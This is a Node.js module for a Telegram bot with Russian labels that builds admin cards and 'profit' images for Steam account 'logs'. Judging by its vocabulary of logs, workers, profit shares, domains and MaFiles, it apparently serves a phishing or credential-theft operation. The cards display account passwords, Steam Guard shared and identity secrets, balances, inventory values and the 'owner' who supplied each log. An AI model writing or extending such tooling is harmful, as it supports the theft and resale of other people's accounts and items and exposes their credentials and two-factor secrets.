const { Markup } = require("telegraf");
const {
  getSteamAccountById,
  getSteamAccounts,
  getSteamInventory,
  getSteamInventorySoft,
  getSteamAccountGames,
} = require("./steamApiService");
const { resolveAccountGames } = require("../utils/steamAccountGames");
const { renderSteamLogImage } = require("../utils/steamLogImageRenderer");
const { renderSteamProfitImage } = require("../utils/steamImageRenderer");
const { telegramHtmlCaption } = require("../utils/emoji");
const { env } = require("../config/env");
const { pe, btn } = require("../utils/emoji");
const { logger } = require("../utils/logger");

const KIND_LABELS = {
  valid: "Валид",
  mafile: "MaFile",
  invalid: "Невалид",
  other: "Другое",
  "": "—",
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function classifyAccountLog(row) {
  if (row?.isMaFile === true || /mafile/i.test(String(row?.status || ""))) return "mafile";
  const status = String(row?.status || "");
  if (/^(ok|valid|валид)$/i.test(status) && !row?.invalidDate) return "valid";
  if (/невалид|invalid/i.test(status)) return "invalid";
  return "other";
}

function escapeHtml(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function money(value) {
  const n = Number(value);
  if (!Number.isFinite(n)) return "—";
  return `$${n.toFixed(2)}`;
}

function parseUsdNumber(value) {
  if (value && typeof value === "object") {
    return parseUsdNumber(value.usd ?? value.value ?? value.amount ?? value.total ?? value.price);
  }
  if (typeof value === "string") {
    const normalized = value.replace(/\s+/g, "").replace(",", ".").replace(/[^0-9.-]/g, "");
    const parsed = Number(normalized);
    return Number.isFinite(parsed) ? parsed : 0;
  }
  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed : 0;
}

function formatDate(value) {
  if (value == null || value === "") return "—";
  if (typeof value === "number") {
    const ms = value > 1e12 ? value : value * 1000;
    const d = new Date(ms);
    if (Number.isNaN(d.getTime())) return String(value);
    return d.toLocaleString("ru-RU");
  }
  const d = new Date(value);
  if (Number.isNaN(d.getTime())) return String(value);
  return d.toLocaleString("ru-RU");
}

/** Средние пункты — ┠, последний — ┖ */
function treeBlock(items) {
  const list = (items || []).filter((v) => v != null && String(v).length);
  return list.map((item, idx) => {
    const branch = idx === list.length - 1 ? "┖" : "┠";
    return `${branch} ${item}`;
  });
}

function unwrapAccount(payload) {
  if (!payload || typeof payload !== "object") return null;
  if (payload.id != null || payload.steamInfo || payload.username) return payload;
  if (payload.data && typeof payload.data === "object") return unwrapAccount(payload.data);
  if (payload.row && typeof payload.row === "object") return unwrapAccount(payload.row);
  if (payload.account && typeof payload.account === "object") return unwrapAccount(payload.account);
  return null;
}

async function fetchSteamAccountById(accountId) {
  const id = String(accountId || "").trim();
  if (!/^\d+$/.test(id)) {
    throw new Error("ID лога должен содержать только цифры.");
  }

  try {
    const raw = await getSteamAccountById(null, id);
    const account = unwrapAccount(raw);
    if (account) return account;
  } catch (error) {
    logger.warn("getSteamAccountById failed, fallback list", id, error.message);
  }

  for (let offset = 0; offset < 500; offset += 50) {
    const payload = await getSteamAccounts(null, { offset, limit: 50 });
    const rows = payload?.rows || payload?.data || [];
    if (!Array.isArray(rows) || !rows.length) break;
    const found = rows.find((row) => String(row.id) === id);
    if (found) return found;
    if (rows.length < 50) break;
  }

  throw new Error(`Лог #${id} не найден в панели.`);
}

async function listSteamAccountsForAdmin({ offset = 0, limit = 30, filter = "" } = {}) {
  const payload = await getSteamAccounts(null, { offset, limit: Math.min(50, Math.max(1, limit)) });
  let rows = payload?.rows || payload?.data || [];
  if (!Array.isArray(rows)) rows = [];
  const q = String(filter || "").trim().toLowerCase();
  if (q) {
    rows = rows.filter((row) => {
      const hay = [
        row.id,
        row.username,
        row.steamInfo?.steamid,
        row.steamInfo?.nickname,
        row.owner?.telegram,
        row.owner?.username,
        row.status,
        classifyAccountLog(row),
      ]
        .map((v) => String(v || "").toLowerCase())
        .join(" ");
      return hay.includes(q) || String(row.id) === q;
    });
  }
  return rows.slice(0, limit).map((row) => ({
    ...row,
    kind: classifyAccountLog(row),
    kindLabel: kindLabel(row),
    priceUsd: accountTotalUsd(row),
  }));
}

function kindLabel(account) {
  return KIND_LABELS[classifyAccountLog(account)] || "—";
}

function accountInventoryUsd(account) {
  const price = account?.inventory?.price || {};
  for (const key of ["tradable", "marketable", "total"]) {
    const n = parseUsdNumber(price[key]);
    if (n > 0) return n;
  }
  return 0;
}

function accountTotalUsd(account) {
  const balance =
    account?.steamInfo?.balanceUsd != null
      ? parseUsdNumber(account.steamInfo.balanceUsd)
      : parseUsdNumber(account?.steamInfo?.balance || 0);
  const inventory = accountInventoryUsd(account);
  return Number(((Number.isFinite(balance) ? balance : 0) + inventory).toFixed(2));
}

function buildAdminLogCardHtml(account) {
  const steam = account?.steamInfo || {};
  const inv = account?.inventory?.price || {};
  const owner = account?.owner || {};
  const games = Array.isArray(account?.gamesInfo) ? account.gamesInfo.filter(Boolean) : [];
  const id = account?.id ?? "—";
  const login = account?.username || steam.nickname || "—";
  const lines = [];

  lines.push(`${pe("package")} <b>Лог #${escapeHtml(id)}</b>`);
  lines.push(
    ...treeBlock([
      `Тип: <b>${escapeHtml(kindLabel(account))}</b>`,
      `Статус панели: <code>${escapeHtml(account?.status || "—")}</code>`,
    ])
  );

  const accountRows = [`Логин: <code>${escapeHtml(login)}</code>`];
  if (account?.password) accountRows.push(`Пароль: <code>${escapeHtml(account.password)}</code>`);
  if (account?.sharedSecret || account?.shared_secret) {
    accountRows.push(
      `Shared secret: <code>${escapeHtml(account.sharedSecret || account.shared_secret)}</code>`
    );
  }
  if (account?.identitySecret || account?.identity_secret) {
    accountRows.push(
      `Identity secret: <code>${escapeHtml(account.identitySecret || account.identity_secret)}</code>`
    );
  }
  accountRows.push(`Steam ID: <code>${escapeHtml(steam.steamid || "—")}</code>`);
  accountRows.push(`Ник Steam: ${escapeHtml(steam.nickname || "—")}`);
  accountRows.push(
    `Уровень: ${steam.level != null && steam.level !== "" ? escapeHtml(steam.level) : "—"}`
  );
  accountRows.push(`Последняя активность: ${escapeHtml(formatDate(steam.lastPlayed))}`);
  if (steam.profileUrl || steam.url) {
    accountRows.push(`Профиль: ${escapeHtml(steam.profileUrl || steam.url)}`);
  }
  if (steam.country || steam.loccountrycode) {
    accountRows.push(`Страна: ${escapeHtml(steam.country || steam.loccountrycode)}`);
  }

  lines.push("");
  lines.push(`${pe("profile")} <b>Аккаунт</b>`);
  lines.push(...treeBlock(accountRows));

  const economyRows = [
    `Общая сумма: <b>${money(accountTotalUsd(account))}</b>`,
    `Баланс: ${
      steam.balanceUsd != null
        ? money(steam.balanceUsd)
        : steam.balance != null
          ? `${escapeHtml(steam.balance)}${steam.balanceCurrency ? ` ${escapeHtml(steam.balanceCurrency)}` : ""}`
          : "—"
    }`,
    `Инвентарь (tradable): ${money(accountInventoryUsd(account))}`,
  ];
  if (inv.total != null && Number(inv.total) !== accountInventoryUsd(account)) {
    economyRows.push(`Инвентарь (total): ${money(inv.total)}`);
  }
  if (inv.locked != null && Number(inv.locked) > 0) {
    economyRows.push(`Лок инвентаря: ${money(inv.locked)}`);
  }
  if (inv.lockedDate) economyRows.push(`Дата лока: ${escapeHtml(formatDate(inv.lockedDate))}`);

  lines.push("");
  lines.push(`${pe("coins")} <b>Экономика</b>`);
  lines.push(...treeBlock(economyRows));

  const ownerRows = [
    `Telegram: <code>${escapeHtml(owner.telegram || "—")}</code>`,
    `Панель: <code>${escapeHtml(owner.username || "—")}</code>`,
  ];
  if (owner.id != null) ownerRows.push(`Owner ID: <code>${escapeHtml(owner.id)}</code>`);

  lines.push("");
  lines.push(`${pe("users")} <b>Владелец</b>`);
  lines.push(...treeBlock(ownerRows));

  const metaRows = [];
  if (account?.isMaFile != null) metaRows.push(`MaFile: <b>${account.isMaFile ? "да" : "нет"}</b>`);
  if (account?.invalidDate) metaRows.push(`Invalid date: ${escapeHtml(formatDate(account.invalidDate))}`);
  if (account?.createdAt || account?.created_at) {
    metaRows.push(`Создан: ${escapeHtml(formatDate(account.createdAt || account.created_at))}`);
  }
  if (account?.updatedAt || account?.updated_at) {
    metaRows.push(`Обновлён: ${escapeHtml(formatDate(account.updatedAt || account.updated_at))}`);
  }
  if (account?.domain || account?.domainId) {
    metaRows.push(`Домен: <code>${escapeHtml(account.domain || account.domainId)}</code>`);
  }
  if (account?.link || account?.path) {
    metaRows.push(`Ссылка/path: <code>${escapeHtml(account.link || account.path)}</code>`);
  }
  if (metaRows.length) {
    lines.push("");
    lines.push(`${pe("file")} <b>Мета</b>`);
    lines.push(...treeBlock(metaRows));
  }

  if (games.length) {
    const gameRows = games.slice(0, 12).map((game) => {
      const name = game.name || `app ${game.appid || "?"}`;
      const hours = game.playtime != null ? ` · ${Number(game.playtime).toFixed(0)} мин` : "";
      return `${escapeHtml(name)}${escapeHtml(hours)}`;
    });
    if (games.length > 12) gameRows.push(`…и ещё ${games.length - 12}`);
    lines.push("");
    lines.push(`${pe("package")} <b>Игры (${games.length})</b>`);
    lines.push(...treeBlock(gameRows));
  }

  const known = new Set([
    "id",
    "username",
    "password",
    "sharedSecret",
    "shared_secret",
    "identitySecret",
    "identity_secret",
    "status",
    "isMaFile",
    "invalidDate",
    "steamInfo",
    "inventory",
    "owner",
    "gamesInfo",
    "accountPrice",
    "createdAt",
    "created_at",
    "updatedAt",
    "updated_at",
    "domain",
    "domainId",
    "link",
    "path",
  ]);
  const extras = [];
  for (const [key, value] of Object.entries(account || {})) {
    if (known.has(key)) continue;
    if (value == null || typeof value === "object") continue;
    extras.push(`${escapeHtml(key)}: <code>${escapeHtml(value)}</code>`);
  }
  if (extras.length) {
  }

  return lines.join("\n");
}

function buildAdminLogInlinePreviewHtml(account) {
  const id = account?.id ?? "—";
  const login = account?.username || account?.steamInfo?.nickname || "—";
  return [
    `${pe("package")} <b>Лог #${escapeHtml(id)}</b>`,
    ...treeBlock([
      `${escapeHtml(login)} · ${escapeHtml(kindLabel(account))}`,
      money(accountTotalUsd(account)),
    ]),
    "",
    `<i>Загрузка полной карточки…</i>`,
  ].join("\n");
}

function buildAdminLogShortCaption(account) {
  const id = account?.id ?? "—";
  const login = account?.username || account?.steamInfo?.nickname || "—";
  return [
    `${pe("package")} <b>Лог #${escapeHtml(id)}</b>`,
    ...treeBlock([
      `${escapeHtml(login)} · ${escapeHtml(kindLabel(account))}`,
      money(accountTotalUsd(account)),
    ]),
  ].join("\n");
}

function buildAdminLogCardKeyboard(account, backTo = "admin:logs") {
  const rows = [];
  if (classifyAccountLog(account) === "mafile" && account?.id != null) {
    rows.push([btn("→", `admin:log:mafile:${account.id}`, "download")]);
  }
  rows.push([btn("Назад", backTo, "home")]);
  rows.push([btn("В админ-панель", "admin:panel", "code")]);
  return Markup.inlineKeyboard(rows);
}

async function buildAdminLogPhoto(account) {
  try {
    return await renderSteamLogImage(account);
  } catch (error) {
    logger.warn("admin log image failed", error.message);
    return null;
  }
}

function itemIcon(item) {
  return (
    item?.icon ||
    item?.icon_url ||
    item?.iconUrl ||
    item?.image ||
    item?.imageUrl ||
    item?.asset_description?.icon_url ||
    item?.assetDescription?.icon_url ||
    item?.description?.icon_url ||
    ""
  );
}

function accountBalanceUsd(account) {
  const raw =
    account?.steamInfo?.balanceUsd != null
      ? account.steamInfo.balanceUsd
      : account?.steamInfo?.balance;
  return Math.max(0, parseUsdNumber(raw));
}

function itemPrice(item) {
  const raw =
    item?.price?.usd ??
    item?.price?.value ??
    item?.price?.amount ??
    item?.priceUsd ??
    item?.price_usd ??
    item?.value ??
    item?.price ??
    0;
  return Math.max(0, parseUsdNumber(raw));
}

function itemName(item) {
  return (
    item?.itemHashName ||
    item?.market_hash_name ||
    item?.hash_name ||
    item?.asset_description?.market_hash_name ||
    item?.assetDescription?.market_hash_name ||
    item?.description?.market_hash_name ||
    item?.name ||
    "Unknown item"
  );
}

function topItems(inventory) {
  const groups = Array.isArray(inventory?.inventories) ? inventory.inventories : [];
  // UProject кладёт appid на группу инвентаря, а не на каждый item.
  const flat = groups.flatMap((group) => {
    const groupAppid = Number(group?.appid || group?.appId || 0);
    return (Array.isArray(group?.items) ? group.items : []).map((item) => ({
      ...item,
      appid: Number(item?.appid || item?.appId || groupAppid || 0),
    }));
  });
  const direct = Array.isArray(inventory?.items) ? inventory.items : [];
  return [...flat, ...direct]
    .map((item) => ({
      appid: Number(item?.appid || item?.appId || 0),
      icon: itemIcon(item),
      itemHashName: itemName(item),
      price: itemPrice(item),
    }))
    .filter((item) => item.price > 0)
    .sort((a, b) => b.price - a.price)
    .slice(0, 7);
}

function resolveSteamId64(account) {
  const candidates = [
    account?.steamInfo?.steamid,
    account?.steamInfo?.steamId,
    account?.steamId,
    account?.steamid,
    account?.id,
  ];
  for (const value of candidates) {
    const sid = String(value || "").trim();
    if (/^7656119\d{10}$/.test(sid)) return sid;
  }
  return "";
}

/**
 * Пикча MaFile (инвентарь / профит-карточка) — единый путь для монитора, админки и профит-канала.
 */
async function buildAdminMaFilePhoto(account, {
  enrich = true,
  token = null,
  workerShare = null,
  workerPercent = null,
  returnSnapshot = false,
} = {}) {
  const steamId = resolveSteamId64(account);
  let inventory = account?.inventory || null;
  const priceOf = (obj, fallback = 0) => {
    const price = obj || {};
    const raw =
      price.tradable != null
        ? price.tradable
        : price.marketable != null
          ? price.marketable
          : price.total != null
            ? price.total
            : fallback;
    return Math.max(0, parseUsdNumber(raw));
  };
  const balanceUsd = accountBalanceUsd(account);
  let inventoryUsd = priceOf(account?.inventory?.price, 0);

  // Не ждём CheckValid: задача может висеть до 2 минут, а карточка должна уходить сразу.
  // Предметы подтягиваем по SteamID64 даже когда в списке есть только price totals.
  const embeddedItems = topItems(inventory || {});
  if (enrich && steamId && !embeddedItems.length) {
    try {
      inventory = await getSteamInventorySoft(steamId, token) || await getSteamInventory(steamId, token);
      inventoryUsd = priceOf(inventory?.price, inventoryUsd);
    } catch (error) {
      const msg = String(error?.message || error || "");
      if (!/\b404\b/i.test(msg) && !/not found/i.test(msg)) {
        logger.warn("admin mafile inventory fetch failed", account?.id, msg);
      }
    }
  }

  // Manual Telegram send uses enrich:false, but account.inventory from the list
  // usually has only price totals. Pull items via /steam/inventory/:steamid —
  // that endpoint often still works when /steam/accounts/:id returns 502.
  const hasItems = topItems(inventory || account?.inventory || {}).length > 0;
  let resolvedSteamId = steamId;
  if (!hasItems && steamId) {
    const soft = await getSteamInventorySoft(steamId, token);
    if (soft) {
      inventory = soft;
      inventoryUsd = priceOf(soft?.price, inventoryUsd) || inventoryUsd;
      resolvedSteamId = String(soft?.steamid || steamId);
    }
  }

  const total = Number((balanceUsd + inventoryUsd).toFixed(2));
  const items = topItems(inventory || account?.inventory || {});
  // Игры часто пустые в момент первого poll (UProject ещё не допарсил /games 502),
  // тогда как инвентарь уже есть через soft inventory. Ретраим и fallback по appid предметов.
  const games = await resolveAccountGames(account, account?.id, getSteamAccountGames, {
    retries: 3,
    retryDelayMs: 1800,
    fallbackItems: items,
    fallbackInventory: inventory || account?.inventory || null,
  });
  if (!games.length) {
    logger.warn("admin mafile games empty after retries", account?.id || steamId || "");
  }
  const mafileTime =
    account?.mafileSessionAvailableAt ||
    account?.maFileSessionAvailableAt ||
    account?.mafileTime ||
    account?.maFileTime ||
    "";
  const imageBuffer = await renderSteamProfitImage({
    items,
    games,
    total,
    balanceUsd,
    inventoryUsd,
    workerShare,
    workerPercent,
    mafileTime,
  });
  if (!returnSnapshot) return imageBuffer;
  return {
    imageBuffer,
    snapshot: {
      items,
      games,
      mafileTime: String(mafileTime || ""),
      steamId: resolvedSteamId || "",
      balanceUsd,
      inventoryUsd,
      total,
    },
  };
}

/**
 * Отправка админ-карточки лога: пикча + полный текст (с учётом лимитов Telegram).
 */
async function sendAdminLogCard(telegram, chatId, account, extra = {}) {
  const fullHtml = buildAdminLogCardHtml(account);
  const imageBuffer = await buildAdminLogPhoto(account);
  const keyboard =
    extra.reply_markup || buildAdminLogCardKeyboard(account).reply_markup;

  let photoMsg = null;
  if (imageBuffer) {
    const useFullAsCaption = fullHtml.length <= 1024;
    photoMsg = await telegram.sendPhoto(
      chatId,
      { source: imageBuffer, filename: `steam-log-${account?.id || "x"}.png` },
      {
        ...telegramHtmlCaption(useFullAsCaption ? fullHtml : buildAdminLogShortCaption(account)),
        // Стрелка MaFile должна быть именно на пикче.
        reply_markup: keyboard,
      }
    );
    if (useFullAsCaption) return photoMsg;
  }

  const chunks = [];
  if (fullHtml.length <= 4000) {
    chunks.push(fullHtml);
  } else {
    let rest = fullHtml;
    while (rest.length) {
      chunks.push(rest.slice(0, 3900));
      rest = rest.slice(3900);
    }
  }

  let last = photoMsg;
  for (let i = 0; i < chunks.length; i += 1) {
    const entityMessage = telegramHtmlCaption(chunks[i]);
    last = await telegram.sendMessage(chatId, entityMessage.caption, {
      entities: entityMessage.caption_entities,
      reply_markup: !photoMsg && i === chunks.length - 1 ? keyboard : undefined,
    });
  }
  return last;
}

module.exports = {
  fetchSteamAccountById,
  listSteamAccountsForAdmin,
  buildAdminLogCardHtml,
  buildAdminLogInlinePreviewHtml,
  buildAdminLogPhoto,
  buildAdminLogShortCaption,
  buildAdminLogCardKeyboard,
  buildAdminMaFilePhoto,
  sendAdminLogCard,
  accountTotalUsd,
  kindLabel,
  classifyAccountLog,
  treeBlock,
  topItems,
};
